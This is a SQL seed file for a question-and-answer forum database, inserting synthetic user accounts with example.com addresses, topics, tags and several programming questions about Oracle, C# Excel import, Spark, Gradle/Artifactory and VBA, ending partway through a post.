INSERT INTO country (name) VALUES ('portugal');
INSERT INTO country (name) VALUES ('france');
INSERT INTO country (name) VALUES ('spain');
INSERT INTO country (name) VALUES ('england');
INSERT INTO country (name) VALUES ('italy');
INSERT INTO country (name) VALUES ('united states of america');

INSERT INTO badge (color, text) VALUES ('#cbbb31', 'novice');
INSERT INTO badge (color, text) VALUES ('#71fa5e', 'enthusiast');
INSERT INTO badge (color, text) VALUES ('#c94937', 'expert');

INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('ticklishpanda851', 'louka.jean@example.com', '6f6aaeed00e8e8be48498f8031bba1079b83cda2a8b7278ebc26770d4b243796', 'iK6Sfptx', 'louka', 'jean', '1959-01-04 00:47:31', 6, 'Administrator');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('whitebutterfly890', 'onur.yetkiner@example.com', 'e2c2503149850c241168ddd21461fe754d4573a73293f7ec1d91f15a28a98651', 'TVl2CkCg', 'onur', 'yetkiner', '1947-10-10 22:03:03', 4, 'Moderator');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('redduck416', 'katrina.palmer@example.com', 'b625c4673883767a0915944ee90852204c4b8907eb37f0155433dbc2b5081802', 'YMK462aV', 'katrina', 'palmer', '1977-06-23 11:35:10', 4, 'Moderator');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('greenlion656', 'thaïs.girard@example.com', 'fc552b3ea5b7bd237d797fa94cab48daadb20d5c738b8e275cf0c59c341359ab', 'sZMW7NvJ', 'thaïs', 'girard', '1980-09-11 22:18:34', 3, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('beautifullion968', 'philip.kristensen@example.com', '6e40987129fcb841b536731a983b8c4a411f21e9eb6bb7785c73a1ecfd4e8568', '0D8Crckj', 'philip', 'kristensen', '1954-06-17 14:32:21', 3, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('orangebird359', 'joanne.ray@example.com', '962f807da99318eed390d1a2faba08f6461bf09be4358096e865a4c5932e0ac1', 'GDLU13iB', 'joanne', 'ray', '1951-01-29 19:04:43', 5, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('beautifulbird895', 'ramon.santos@example.com', '353ff728c42af5aed8c64fd832a2b00b1826fef23cc71480c19082a2111c2e04', 'Zn89n2aY', 'ramon', 'santos', '1983-12-26 03:40:07', 4, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('tinylion410', 'merith.versteden@example.com', '417957d23e9c5b35455e681848ce4597780941b3eb3430889c6056efd24ee58f', 'k0HAEfKE', 'merith', 'versteden', '1954-11-13 17:25:04', 3, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('purplegoose486', 'kristina.evans@example.com', 'd2e6744e58359195952f4b8a6bbc06094994d123f26127462dcfa4531abb7871', 'C4jJpI7y', 'kristina', 'evans', '1984-08-23 17:00:10', 1, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('goldenlion206', 'ezio.carpentier@example.com', 'e557a2e13743190313d3c15ef2b708ebe55f0d8f8f68aa62d86086d24628d24d', 'VRxKz0SV', 'ezio', 'carpentier', '1951-08-05 03:45:31', 1, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('tinygorilla375', 'tamara.ernst@example.com', '7e9c660ab8d24bd1660825436b7f349424eb7f7a5467e85aa487e5a7f21ebb60', 'DJHpWCpi', 'tamara', 'ernst', '1972-09-22 23:28:02', 2, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('whitefrog533', 'faith.ryan@example.com', 'f89360e595c9ad482efee528996b98a4d5e8ba71d46f95740014ecef47e3804d', 'IgvZ0LdT', 'faith', 'ryan', '1952-08-26 08:03:42', 3, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('lazypeacock854', 'madeleine.brown@example.com', 'd021485a48c02a6a5580d7aed1d350ae1a4f5cc2f72756513ce16726e22b0327', 'BHlHfUDT', 'madeleine', 'brown', '1980-02-20 12:31:29', 2, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('organictiger199', 'armando.thomas@example.com', '00fc338a19d929951a06f4a9e0478e63f867cbd2323b4443cf7c46a10ae2a5bb', 'vojJxZX8', 'armando', 'thomas', '1969-04-10 17:26:48', 3, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('crazygorilla212', 'souhaila.belfor@example.com', '0077379b250f5c94dc655b47e066d53dca30ffabdd51eaed1afb85a5b5df4af9', 'WLRCaZwJ', 'souhaila', 'belfor', '1960-11-01 02:11:09', 1, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('organicmouse339', 'ema.bruines@example.com', '6d5dfe180829ddc23e4ced669311a8744bdf82cc32eb761427b9afbf25671373', '57NvI6Ri', 'ema', 'bruines', '1971-09-13 16:38:13', 3, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('heavyfrog593', 'مارال.كامياران@example.com', '9a3229b84914f1d6629e8baf13430dd651572ef8559a75c669a989d21207ab7f', 'NeBWBIjq', 'مارال', 'كامياران', '1950-12-02 14:41:48', 2, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('blackbear820', 'getúlia.dacruz@example.com', '51f9cece5b1f035ed62332d39b056606249bcb512ce63a2d50595178ec42f1af', 'qhadGEnb', 'getúlia', 'da cruz', '1980-08-15 12:50:24', 4, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('goldensnake311', 'ryan.williams@example.com', '9cf905d26af2f8eba966c6faa5edcb30e3bcabd12cf6c3cae600d344929db1ba', 'AxZI643h', 'ryan', 'williams', '1956-05-22 11:46:09', 6, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('bluelion422', 'willie.ray@example.com', '60d5a26d8e4d963818da723efc8bf15215b92aca0e33dab55571297be238a820', 'k2YRZyPp', 'willie', 'ray', '1981-02-12 04:23:50', 2, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('bigswan244', 'alex.henry@example.com', '165a5ade0099571da453f68eccf5b97684ccfe6dafd48885f6fac2578df20d5a', 'MSxUQNFe', 'alex', 'henry', '1980-07-12 02:58:04', 1, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('organicwolf317', 'آرمیتا.یاسمی@example.com', '4a7f14a83cad76ee5ed561af8f91f035871116279798a143269a483ab61c545e', 'IYnaqxzi', 'آرمیتا', 'یاسمی', '1975-07-14 19:19:40', 1, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('smallpeacock817', 'toivo.manner@example.com', 'c3d796653a12f069c94c952f0548250ef1a2481ceaf55b8fbdeea3a5db3dae91', 'HV7xzsT6', 'toivo', 'manner', '1956-04-01 23:31:28', 6, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('crazyladybug364', 'tracy.nguyen@example.com', '46e6d97163d10ddc9c9459f86c89f5368b4797a43c312f31ec4e05720b0c176a', 'dhWIY5JF', 'tracy', 'nguyen', '1953-11-25 04:32:43', 4, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('organicmeercat210', 'jennifer.butler@example.com', '8ae170f0957776917f9a91db022a50a45dfbe1928b65062087d773a0f7a80d87', 'LbfpUCJN', 'jennifer', 'butler', '1956-08-07 23:48:31', 1, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('tinybear818', 'alejandro.herrero@example.com', '66809f8c735b5496c991bc26ac11ea37d583d78b6f16e24a2661a4d42de67ed9', '3T3fjqT5', 'alejandro', 'herrero', '1957-05-01 22:26:39', 2, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('beautifulpeacock816', 'caroline.perkins@example.com', '03c5fc645994ec955b7cea7d311112279180f48ccd3bef83ff9bfa9989730dce', 'RD38W1D6', 'caroline', 'perkins', '1991-03-28 10:00:02', 1, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('orangeduck553', 'summer.walker@example.com', '56cef3d89c9b11330d83f175dbdbb6cdf06b126ca5e0d5739314c670f99bec70', 'LntWpPGq', 'summer', 'walker', '1982-01-22 12:06:57', 1, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('bluesnake595', 'elísia.damota@example.com', '3316e66da9d3dfb818ed6c905de4e2b87153b5a534b58eb4d2479dfcb1f4cf6d', 'PhUpBRAL', 'elísia', 'da mota', '1957-12-29 09:24:15', 1, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('silverelephant178', 'natalie.meyer@example.com', '9ba3ebea3d87ead7b4d168320edb26b9dbff2037a8f70e4e417df29335fdeaa0', '43KkAxNw', 'natalie', 'meyer', '1988-08-01 09:27:02', 5, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('blackdog210', 'morris.garrett@example.com', '3525835d8f81b360854af4841e9f809f587520be243cf4cf695799d1b769c610', 'QcU3S7wA', 'morris', 'garrett', '1989-03-06 09:53:53', 1, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('whiteswan936', 'mila.duval@example.com', '0d714ebdc62c53db13c886b7a50c5c31fd6458adc363ee1e1fb2ceef90acaa65', 'OHW07gA3', 'mila', 'duval', '1992-08-13 08:14:52', 6, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('blackcat679', 'kitty.herrera@example.com', '3cd15bb84e4e234e753e6aad445cc7665f55e7d2bcd28b8e7b6249e709a6315b', 'PLxtLlJE', 'kitty', 'herrera', '1949-12-21 07:47:19', 2, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('whitelion250', 'eloane.lucas@example.com', '6ee06199383e926e6e48d303170cf499e2c7e83ec96f41eebf235d4e7522871c', 'mCrlyvOG', 'eloane', 'lucas', '1974-10-15 01:18:13', 5, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('browndog263', 'albert.payne@example.com', '0e9928056baab072001e589a7081dea7e8d2fa98ecd31ff5d7720de4a12441a8', 'Cmnkyeqr', 'albert', 'payne', '1965-01-18 15:15:43', 4, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('goldendog582', 'ayla.wright@example.com', 'c652d304e9a92317421a9dfcfbd1fd377bc90e904dcd91a9878e2c71c63ff646', 'HyDbZWQi', 'ayla', 'wright', '1978-02-15 12:48:51', 4, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('bigbear502', 'kylie.wells@example.com', '9b8003a3c4023a44898c02a663d0339b663e92b2ff0d82e412d73af8b9725ff3', 'pnEZDsD6', 'kylie', 'wells', '1968-04-03 00:20:57', 3, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('crazywolf916', 'niklas.paavola@example.com', 'a402c0feb1effaa6678a0f14d2a118403c252543cb55a7aada82deb5c29e5a02', 'LgOJg2zB', 'niklas', 'paavola', '1959-12-14 10:05:40', 3, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('ticklishfish231', 'ilona.kujala@example.com', '024ddf24e3ed5091248fbd5ca1f47507a937946824c55bdd9bf8c67b3c54b32a', 'ZPHS0sXD', 'ilona', 'kujala', '1948-05-16 05:28:00', 1, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('greengorilla561', 'juliette.caron@example.com', '6dfae97bff199550028f248f2e2b449c75e0fe5ddd29875b42accc330a49a7d7', 'NtL2M6gu', 'juliette', 'caron', '1956-12-10 17:56:40', 1, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('purplepanda411', 'alexis.lam@example.com', '753f802ff586c614d43291d5738b4842a063b1662d2654fc0660f2a2dab2b72c', 'wXXzTDAc', 'alexis', 'lam', '1992-12-07 16:14:51', 3, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('brownelephant337', 'jonas.poulsen@example.com', 'c80866e43e07f9eb3756b0166c217e4e5bfbc187463c4bb6f0ef1c3d115ee51f', 'Paf3FpK5', 'jonas', 'poulsen', '1945-11-18 05:47:39', 4, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('organicmeercat486', 'julie.madsen@example.com', '4930d73bd2b161782f39a45bcdaa9cc87f089322f88728c95c9f559f26b7f79f', 'FOvjhSVy', 'julie', 'madsen', '1994-07-12 14:31:28', 5, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('beautifuldog178', 'ben.schubert@example.com', '747c96638a6663fd545f4ad9ba5ae5fb7201ad67b38780ab7f9c6467a8f53220', 'sjlgK9nj', 'ben', 'schubert', '1982-07-27 00:10:57', 3, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('beautifulcat157', 'laly.lecomte@example.com', '6474e6801e3529d09f26fb3c2bfab11c336da7529bbfae51b0b398729dcd9a17', 'hhnzQKp8', 'laly', 'lecomte', '1972-11-26 11:11:02', 2, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('bluetiger507', 'mikael.heikkinen@example.com', '1bc0af2d8470bade78a8a0f7f9fd3092b96608ea50100a93ce8bf68c5f1685b3', 'HcYSy39X', 'mikael', 'heikkinen', '1946-08-06 02:16:22', 2, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('bluesnake699', 'candice.lefevre@example.com', '0a5ce40a223cb65c7d1d41e31343281ee5d7e3cd567c79a4c9252337b2857a16', '32f6jG5G', 'candice', 'lefevre', '1951-11-29 02:44:43', 1, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('greenduck571', 'nerea.ortega@example.com', 'c7842ebe77f0cfd778c75ac1ec74887473526f86874a70d0ca427a34a71e0b29', 'wZIjrGZG', 'nerea', 'ortega', '1989-08-14 10:30:13', 2, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('blueduck963', 'bérénice.guillaume@example.com', '74080cb9e2533499ffd54e55ccafefa8e18101c59739d23a4dbdc81f62c3fcf5', '1D3cWPiN', 'bérénice', 'guillaume', '1970-05-06 23:41:16', 3, 'Registered');
INSERT INTO useracc (username, email, password, salt, first_name, last_name, birth, country, user_type) VALUES ('heavyfrog405', 'aurora.smith@example.com', '5ba2eed8ce9526068522e633f1f1fb9a70c2f0f7258015521907f58ddc008d73', 'd3b4Ghyw', 'aurora', 'smith', '1945-09-29 05:44:22', 1, 'Registered');

INSERT INTO topic (admin_id, topicname, description) VALUES (1, 'programming', 'for programmers, just like you.');
INSERT INTO topic (admin_id, topicname, description) VALUES (1, 'mathematics', 'for people studying math at any level.');
INSERT INTO topic (admin_id, topicname, description) VALUES (1, 'aviation', 'for aircraft pilots, mechanics and enthusiasts.');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (1, 42, '&lt;p&gt;When I execute this in PL/SQL Developer :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SELECT to_date(&#x27;29/03/17 14:05&#x27;,&#x27;DD/MM/RR HH24:MI&#x27;)  FROM dual;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here&#x27;s what I get :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;3/29/2017 2:05:00 PM
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;How is this possible ? I use &lt;code&gt;HH24&lt;/code&gt; but it seems like it&#x27;s &lt;code&gt;HH&lt;/code&gt; that&#x27;s being used instead. The day and month are also not in the format I entered.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (1, 1, 'Oracle PL/SQL : to_date() format not considered');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (1, 1, 42, 'Create');
INSERT INTO tag (text) VALUES ('sql');
INSERT INTO questiontag (question_id, tag_id) VALUES (1, 1);
INSERT INTO tag (text) VALUES ('oracle');
INSERT INTO questiontag (question_id, tag_id) VALUES (1, 2);
INSERT INTO tag (text) VALUES ('date');
INSERT INTO questiontag (question_id, tag_id) VALUES (1, 3);
INSERT INTO tag (text) VALUES ('plsql');
INSERT INTO questiontag (question_id, tag_id) VALUES (1, 4);
INSERT INTO tag (text) VALUES ('format');
INSERT INTO questiontag (question_id, tag_id) VALUES (1, 5);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (2, 9, '&lt;p&gt;I am getting the error &quot;The given ColumnMapping does not match up with any column in the source or destination.&quot; with the following code&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; private void button1_Click_1(object sender, EventArgs e)
        {
            of1.Filter = &quot;Excel Files|*.xls;*.xlsx;*.xlsm&quot;;
            if ((of1.ShowDialog()) == System.Windows.Forms.DialogResult.OK)
            {
                imagepath = of1.FileName; //file path
                textBox1.Text = imagepath.ToString();
            }
        }

        private void loadbtn_Click(object sender, EventArgs e)
        {
            string ssqltable = comboBox1.GetItemText(comboBox1.SelectedItem);
            string myexceldataquery = &quot;select * from [&quot;+ ssqltable + &quot;$]&quot;;
            try
            {
                OleDbConnection oconn = new OleDbConnection(@&quot;Provider=Microsoft.ACE.OLEDB.12.0;Data Source=&quot;+imagepath+&quot;;Extended Properties=&#x27;Excel 12.0 Xml; HDR=YES;IMEX=1;&#x27;;&quot;);
                string ssqlconnectionstring = &quot;Data Source=.;Initial Catalog=Bioxcell;Integrated Security=true&quot;;

                OleDbCommand oledbcmd = new OleDbCommand(myexceldataquery, oconn);
                oconn.Open();
                OleDbDataReader dr = oledbcmd.ExecuteReader();
                SqlBulkCopy bulkcopy = new SqlBulkCopy(ssqlconnectionstring);
                bulkcopy.DestinationTableName = ssqltable;
                while (dr.Read())
                {
                    bulkcopy.WriteToServer(dr);
                }

                oconn.Close();
            }

            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
           /* DisplayingData DD = new DisplayingData();
            DD.Show();*/
        }
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I think Sql is case sensitive and i copied the same column names but the same error .. 
&lt;a href=&quot;https://i.stack.imgur.com/7mypZ.jpg&quot; rel=&quot;nofollow noreferrer&quot;&gt;enter image description here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/Ry977.jpg&quot; rel=&quot;nofollow noreferrer&quot;&gt;enter image description here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Is there away around this?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (2, 1, '&quot;The given ColumnMapping does not match up with any column in the source or destination&quot; while importing Excel to Sql Server using c#');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (2, 2, 9, 'Create');
INSERT INTO tag (text) VALUES ('c#');
INSERT INTO questiontag (question_id, tag_id) VALUES (2, 6);
INSERT INTO tag (text) VALUES ('sql-server');
INSERT INTO questiontag (question_id, tag_id) VALUES (2, 7);
INSERT INTO tag (text) VALUES ('excel');
INSERT INTO questiontag (question_id, tag_id) VALUES (2, 8);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (3, 31, '&lt;p&gt;I am running Spark 2.1.0 on Windows 10. I connected to a MySQL database to get data into spark using JDBC. As shown below, whenever I perform an action I get the following warning which makes me wonder that the data is being retrieved from database for every operation.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;scala&amp;gt; val jdbcDF2 = spark.read.jdbc(&quot;jdbc:mysql:dbserver&quot;, &quot;schema.tablename&quot;, connectionProperties)
Wed Mar 29 15:05:23 IST 2017 WARN: Establishing SSL connection without server&#x27;s identity verification is not recommended. According to MySQL 5.5.45+, 5.6.26+ and 5.7.6+ requirements SSL connection must be established by default if explicit option isn&#x27;t set. For compliance with existing applications not using SSL the verifyServerCertificate property is set to &#x27;false&#x27;. You need either to explicitly disable SSL by setting useSSL=false, or set useSSL=true and provide truststore for server certificate verification.
jdbcDF2: org.apache.spark.sql.DataFrame = [id: bigint, site: bigint ... 15 more fields]

scala&amp;gt; jdbcDF2.count
Wed Mar 29 15:09:09 IST 2017 WARN: Establishing SSL connection without server&#x27;s identity verification is not recommended. According to MySQL 5.5.45+, 5.6.26+ and 5.7.6+ requirements SSL connection must be established by default if explicit option isn&#x27;t set. For compliance with existing applications not using SSL the verifyServerCertificate property is set to &#x27;false&#x27;. You need either to explicitly disable SSL by setting useSSL=false, or set useSSL=true and provide truststore for server certificate verification.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If this is the case, is there a way by which I can save the data in a spark local object like a DataFrame so that it doesn&#x27;t have to connect to database all the time?&lt;/p&gt;

&lt;p&gt;I tried to &lt;a href=&quot;http://spark.apache.org/docs/latest/sql-programming-guide.html#caching-data-in-memory&quot; rel=&quot;nofollow noreferrer&quot;&gt;cache the table&lt;/a&gt; and it runs successfully but I am unable to use Spark-SQL on the table&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;scala&amp;gt; jdbcDF2.cache()
res6: piwik_log_visitDF.type = [idvisit: bigint, site: bigint ... 15 more fields]
scala&amp;gt; val unique = sql(&quot;SELECT DISTINCT site FROM jdbcDF2&quot;)
org.apache.spark.sql.AnalysisException: Table or view not found: jdbcDF2;
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (3, 1, 'Spark connects to database every time I perform a Transformation/Action?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (3, 3, 31, 'Create');
INSERT INTO tag (text) VALUES ('scala');
INSERT INTO questiontag (question_id, tag_id) VALUES (3, 9);
INSERT INTO tag (text) VALUES ('apache-spark');
INSERT INTO questiontag (question_id, tag_id) VALUES (3, 10);
INSERT INTO tag (text) VALUES ('apache-spark-sql');
INSERT INTO questiontag (question_id, tag_id) VALUES (3, 11);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (4, 47, '&lt;p&gt;I&#x27;m quite new to the JFrog Artifactory, but here is my requirement : I want to resolve my compile dependencies using Artifactory and publish the built artifacts to the Artifactory. Now I use gradle for my build. Also going through the initial tutorial I&#x27;m able to publish my artifacts to the repository. However now I want to be able to compile my project using the Artifactory. My project has some thirdparty dependencies lets say commons-logging and antlr. The script that i have is as follows &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;artifactory {
    contextUrl = &#x27;http://localhostr:8081/artifactory&#x27;   //The base Artifactory URL if not overridden by the publisher/resolver
    publish {
        repository {
            repoKey = &#x27;gradle-dev-local&#x27;
            username = &quot;${artifactory_user}&quot;
            password = &quot;${artifactory_password}&quot;
            maven = true

        }
        defaults {
            publications (&#x27;mavenJava&#x27;)
            publishPom = false
        }
    }
    resolve {
        repository {
            repoKey = &#x27;gradle-dev&#x27;
            username = &quot;${artifactory_user}&quot;
            password = &quot;${artifactory_password}&quot;
            maven = true
        }
    }
}

publishing {
    publications {
        mavenJava(MavenPublication) {
            from components.web
        }
    }
}

dependencies {
    compile &#x27;antlr:antlr:2.7.6&#x27;,
    &#x27;commons-logging:commons-logging:1.1&#x27;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now i want to know is how do I have these thirdparty dependecnies in my gradle-dev repository in the gradle format. Altogether my gradle projects use around 40-50 such thirdparties. Is there a simpler way to do copy all these dependecnies to my Artifactory ?&lt;/p&gt;

&lt;p&gt;Thanks in advance&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (4, 1, 'Setup a thirdparty dependency repository on Artifactory');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (4, 4, 47, 'Create');
INSERT INTO tag (text) VALUES ('gradle');
INSERT INTO questiontag (question_id, tag_id) VALUES (4, 12);
INSERT INTO tag (text) VALUES ('artifactory');
INSERT INTO questiontag (question_id, tag_id) VALUES (4, 13);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (5, 42, '&lt;p&gt;I have the below code which I wish to hide columns based on the case. However it is not working. I suspect it may be to do with the groupings and layout of the sheet however have never come across an issue when using this code before. &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Private Sub worksheet_Change(ByVal Target As Range)
  If Not Intersect(Target, Range(&quot;C2&quot;)) Is Nothing Then
    On Error GoTo bm_Safe_Exit
    ActiveSheet.Unprotect Password:=&quot;Password&quot;
    Application.ScreenUpdating = False
    Application.EnableEvents = False
    Columns(&quot;AD:JF&quot;).Hidden = False

    Select Case Range(&quot;C2&quot;).Value2
        Case 1
            Columns(&quot;AQ:DC,DR:GD,GS:JE&quot;).Hidden = True
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=3
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=2
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=1
        Case 2
            Columns(&quot;BD:DC,EE:GD,HF:JE&quot;).Hidden = True
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=3
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=2
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=1
        Case 3
            Columns(&quot;BQ:DC,ER:GD,HS:JE&quot;).Hidden = True
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=3
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=2
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=1
        Case 4
            Columns(&quot;CD:DC,FE:GD,IF:JE&quot;).Hidden = True
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=3
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=2
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=1
        Case 5
            Columns(&quot;CQ:DC,FR:GD,IS:JE&quot;).Hidden = True
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=3
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=2
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=1
        Case 6
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=3
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=2
            ActiveSheet.Outline.ShowLevels RowLevels:=0, ColumnLevels:=1
    End Select
End If

bm_Safe_Exit:
Application.EnableEvents = True
Application.ScreenUpdating = True
ActiveSheet.Protect Password:=&quot;password&quot;

End Sub
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Picture included of spreadsheet layout
&lt;a href=&quot;https://i.stack.imgur.com/HxdKy.jpg&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/HxdKy.jpg&quot; alt=&quot;enter image description here&quot;&gt;&lt;/a&gt;&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (5, 1, 'Select Case VBA not working');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (5, 5, 42, 'Create');
INSERT INTO tag (text) VALUES ('vba');
INSERT INTO questiontag (question_id, tag_id) VALUES (5, 14);
INSERT INTO tag (text) VALUES ('excel-vba');
INSERT INTO questiontag (question_id, tag_id) VALUES (5, 15);
INSERT INTO tag (text) VALUES ('module');
INSERT INTO questiontag (question_id, tag_id) VALUES (5, 16);
INSERT INTO tag (text) VALUES ('intersection');
INSERT INTO questiontag (question_id, tag_id) VALUES (5, 17);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (6, 43, '&lt;p&gt;i have just installed my Oracle Sql Developer 11g , and when I&#x27;m starting to make a new database connection and it failed so im configuring the ora files(tnsnames.ora and LISTENER.ora) but their contents are not same as the ora files that shown at the tutorials when I&#x27;m researching. So is this the right content of a tnsnames.ora and LISTENER.ora file? Thank you for answering..&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;this is my tnsnames.ora

# This file contains the syntax information for 
# the entries to be put in any tnsnames.ora file
# The entries in this file are need based. 
# There are no defaults for entries in this file
# that Sqlnet/Net3 use that need to be overridden 
#
# Typically you could have two tnsnames.ora files
# in the system, one that is set for the entire system
# and is called the system tnsnames.ora file, and a
# second file that is used by each user locally so that
# he can override the definitions dictated by the system
# tnsnames.ora file.

